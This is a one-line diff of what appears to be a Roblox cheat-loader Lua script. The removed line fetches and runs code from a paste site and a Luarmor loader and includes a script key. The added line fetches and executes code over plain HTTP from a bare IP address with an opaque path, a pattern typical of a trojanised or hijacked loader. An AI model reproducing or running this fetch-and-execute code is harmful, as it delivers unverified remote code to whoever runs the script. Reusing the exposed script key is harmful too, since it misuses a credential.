@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()end)script_key="jsannFjLAbqrdAzNwgOerENvUEhbqFmq"loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4109f8447808f89121335990a22ed888.lua"))()
+task.spawn(function()loadstring(game:HttpGet("http://84.200.89.110/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()end)loadstring(game:HttpGet(""))()
